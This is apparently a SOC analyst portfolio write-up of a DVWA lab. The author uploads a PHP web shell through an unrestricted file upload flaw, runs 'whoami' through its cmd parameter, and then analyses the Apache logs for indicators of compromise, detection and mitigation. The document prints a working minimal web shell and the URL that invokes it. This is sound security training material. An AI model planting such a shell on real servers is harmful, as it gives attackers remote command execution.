# Web Shell Upload Detection using DVWA and Apache Logs

## Project Overview

This project demonstrates how an unrestricted file upload vulnerability can be exploited to upload a PHP web shell in a controlled DVWA (Damn Vulnerable Web Application) lab. After successfully uploading the file, Apache access logs were analyzed from a SOC Analyst perspective to identify indicators of compromise (IOCs), understand attacker activity, and discuss possible detection methods.

> **Disclaimer**
>
> This project was performed in a local lab environment for educational purposes only.

---

# Objective

The objectives of this project were to:

- Understand unrestricted file upload vulnerabilities
- Upload a PHP web shell in a controlled environment
- Execute a harmless Linux command (`whoami`)
- Analyze Apache access logs
- Identify Indicators of Compromise (IOCs)
- Map attacker activity to MITRE ATT&CK
- Practice SOC Analyst investigation techniques

---

# Lab Environment

| Component | Details |
|-----------|---------|
| Operating System | Kali Linux |
| Vulnerable Application | DVWA |
| Web Server | Apache2 |
| Database | MariaDB |
| PHP | PHP 8.1 |
| Browser | Firefox |
| Security Level | Low |

---

# Tools Used

- DVWA
- Apache2
- MariaDB
- Linux Terminal
- Firefox
- Apache Access Logs

---

# Vulnerability

DVWA contains an intentionally vulnerable **File Upload** module.

At the **Low** security level, uploaded files are not properly validated, allowing executable PHP files to be stored inside the web-accessible uploads directory.

---

# Attack Scenario

A simple PHP web shell was created and uploaded.

**shell.php**

```php
<?php
echo "<h2>DVWA Upload Test</h2>";

if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
```

After uploading the file, it was accessed through the browser and a harmless Linux command was executed.

---

# Attack Steps

## 1. Upload PHP Web Shell

Navigate to:

```
DVWA → Vulnerabilities → File Upload
```

Upload:

```
shell.php
```

**Result**

```
Upload Successful
```

> **Screenshot**

```
screenshots/01-upload-success.png
```

---

## 2. Access Uploaded File

```
http://localhost/DVWA/hackable/uploads/shell.php
```

Output:

```
DVWA Upload Test
```

> **Screenshot**

```
screenshots/02-shell-page.png
```

---

## 3. Execute Command

```
http://localhost/DVWA/hackable/uploads/shell.php?cmd=whoami
```

Output:

```
www-data
```

The command executes under the Apache web server account.

> **Screenshot**

```
screenshots/03-command-execution.png
```

---

# Apache Log Analysis

Relevant log entries:

```text
127.0.0.1 - - [11/Jul/2026:18:50:33 +0530] "GET /DVWA/hackable/uploads/shell.php HTTP/1.1" 200

127.0.0.1 - - [11/Jul/2026:18:50:48 +0530] "GET /DVWA/hackable/uploads/shell.php?cmd=whoami HTTP/1.1" 200
```

Observations:

- A PHP file was executed from an upload directory.
- The `cmd` parameter was supplied in the request.
- Multiple requests targeted the uploaded PHP file.
- HTTP status code **200 OK** confirms successful processing.

> **Screenshot**

```
screenshots/04-access-log.png
```

---

# Indicators of Compromise (IOCs)

| IOC | Value |
|------|-------|
| Source IP | 127.0.0.1 (Lab Environment) |
| Uploaded File | shell.php |
| Upload Directory | /DVWA/hackable/uploads/ |
| Suspicious Parameter | cmd=whoami |
| HTTP Response | 200 OK |
| Web Server | Apache2 |

---

# MITRE ATT&CK Mapping

| Technique | ID |
|-----------|----|
| Exploit Public-Facing Application | T1190 |
| Command and Scripting Interpreter: Unix Shell | T1059.004 |

---

# Detection Opportunities

A SOC analyst can monitor for:

- PHP files executed inside upload directories
- Requests containing suspicious parameters (e.g., `cmd=`)
- Repeated access to newly uploaded executable files
- Unexpected executable files stored in upload locations

---

# Mitigation

Recommended mitigations include:

- Validate file extensions on the server side
- Verify MIME types
- Rename uploaded files
- Store uploads outside the web root
- Disable execution of scripts inside upload directories
- Deploy a Web Application Firewall (WAF)
- Monitor upload directories for executable files

---

# Skills Demonstrated

- Linux Administration
- Apache Web Server
- PHP Fundamentals
- Web Application Security
- Log Analysis
- Indicator of Compromise (IOC) Identification
- Incident Investigation
- MITRE ATT&CK Mapping
- SOC Analyst Methodology

---

# Key Takeaways

Through this project, I learned how unrestricted file upload vulnerabilities can be abused to upload executable server-side code. I practiced analyzing Apache access logs to identify suspicious activity, extracted indicators of compromise, and documented detection opportunities from a SOC analyst's perspective. This exercise reinforced the importance of correlating web server activity with potential indicators of malicious behavior.

---

# Future Improvements

- Forward Apache logs to Splunk
- Create detection rules for suspicious upload activity
- Develop Splunk dashboards
- Write SIEM detection queries
- Generate alerts for web shell activity

---

# Author

**Azeem Attar**

SOC Analyst Portfolio

GitHub: https://github.com/azeemattar/SOC-Analyst-Portfolio
